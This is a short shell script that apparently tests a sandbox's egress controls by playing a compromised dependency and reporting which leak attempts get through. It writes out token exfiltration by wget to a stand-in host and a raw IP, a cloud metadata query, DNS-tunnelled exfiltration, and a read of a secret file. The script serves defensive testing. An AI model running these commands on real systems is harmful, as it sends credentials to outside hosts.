#!/bin/sh
# Plays a compromised dependency inside a service that legitimately holds a
# secret. Each line says what it tried and whether it got through.
try() { label="$1"; shift; if "$@" >/dev/null 2>&1; then echo "LEAKED   $label"; else echo "BLOCKED  $label"; fi; }
echo "token in my environment: ${DEMO_TOKEN:+yes}"
echo "printing the token, which logs should mask: $DEMO_TOKEN"
try "https to a host not on the allowlist"  wget -q -T 5 -O- "https://exfil.example.net/?t=$DEMO_TOKEN"
try "http to a raw IP"                      wget -q -T 5 -O- "http://203.0.113.7/?t=$DEMO_TOKEN"
try "cloud metadata address"                wget -q -T 5 -O- http://169.254.169.254/latest/meta-data/
try "DNS lookup carrying the token"         nslookup "$DEMO_TOKEN.exfil.example.net"
try "reading the VM's secret folder"        cat /run/secbox/env.api
sleep 3600
